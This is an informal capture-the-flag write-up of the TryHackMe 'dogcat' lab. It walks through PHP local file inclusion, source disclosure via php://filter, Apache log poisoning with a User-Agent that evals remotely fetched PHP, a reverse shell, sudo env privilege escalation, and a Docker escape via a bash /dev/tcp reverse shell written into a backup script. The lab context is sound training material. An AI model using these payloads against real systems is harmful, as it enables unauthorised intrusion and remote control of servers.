```
IP: 10.10.116.227
```


DogCat!

After fucking with the URL, i saw it was doing local file opening. Since it said it only allows "cats" or "dogs",i tried to mess with the URL to include the word but still Directory traverse.


`http://10.10.29.104/?view=cat%00../`
Produces this error showing its possible to include files.
Need to find a way to escape the .php
4
Path : .:/usr/local/lib/php
`Warning: include(): Failed opening 'cat' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24`

Webserver:
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.4.3

After messing aroudn a while, it seems that the PHP FILTER works, lets use that to fetch the .php restricting our LFI, lets see whatsup
Using PHP://filter and base64 encoding PHP files for reading.

``http://10.10.116.227/?view=php://filter/read=convert.base64-encode/resource=./dog/../index``

```
echo "PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg==" | base64 -d > index.php
```
now that we know how it works, and we're not trying to read a PHP file directly, we can get rid of the base64 encoding.

Now lets see if we can get some other files for reading:
  /etc/passwd

  ``http://10.10.116.227/?ext=&view=dog/../../../../../etc/passwd``

after doing some research, one of the things they recommend is to check if you can read the access log files so you can do something thats called
  ``http://10.10.116.227/?ext=&view=dog/../../../../var/log/apache2/access.log``

Log Poisioning Injection HEADERS:
```
GET /?view=dog HTTP/1.1
Host: 10.10.155.112
Upgrade-Insecure-Requests: 1
User-Agent: <?php eval(file_get_contents('http://10.14.12.121:8000/command.txt')); ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.155.112/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

Reliable Reverse shell made:

now to elevate privileges:

  sudo -l shows `env` can be used in sudo without password.
  GTFObins shows env has a shell escape

    ``sudo env /bin/sh``

Somehow getting Root is not the final flag... lets see if we can find the last flag


```
┌──(kali㉿kali)-[~/tryhackme-writeups/dogcat]
└─$ rlwrap nc -lvnp 4444                                                                                                                                 1 ⨯
listening on [any] 4444 ...
connect to [10.14.12.121] from (UNKNOWN) [10.10.155.112] 50526
sudo env /bin/sh
whoami
root
```

From here, i wasnt really sure how to escape docker... So i read the writeup (And planned to do some Docker learning after this one.)
Apparently, in /ops/ there is a backup folder with files that is recently chbange

We should have seen this from probably looking at recently changes files and determine that backup.sh was called externally.


```
echo "#!/bin/bash" > /opt/backups/backup.sh
echo "/bin/bash -c 'bash -i >& /dev/tcp/10.14.12.121/4445 0>&1'" >> /opt/backups/backup.sh
```
